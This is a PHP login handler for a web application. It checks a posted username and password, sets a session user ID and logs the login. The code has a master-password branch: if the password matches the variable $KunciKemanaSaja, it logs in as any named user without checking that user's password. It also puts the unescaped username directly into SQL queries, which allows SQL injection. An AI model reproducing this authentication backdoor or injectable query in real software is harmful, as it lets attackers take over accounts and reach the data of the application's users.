<?php
if(isset($timestamp) && isset($_POST['username']) && isset($_POST['password'])) {
    $u = $_POST['username'];

    if($_POST['password'] == $KunciKemanaSaja) {
        $get = select("user","username='$u'");
    } else {
        $p = h4sh($_POST['password']);
        $get = select("user","username='$u' AND password='$p' AND status='1'");
    }

    if(isset($get) && mysqli_num_rows($get) == 1){
        $data = mysqli_fetch_array($get);
        $r['OK'] = true;
        $r['AS'] = $data['role'];
        $_SESSION['auladi_user_id'] = $data['ID'];

        insert("login","username='$u', timestamp='$timestamp'");
    } else {
        $r['m'] = "Username / Password salah!";
    }
}
?>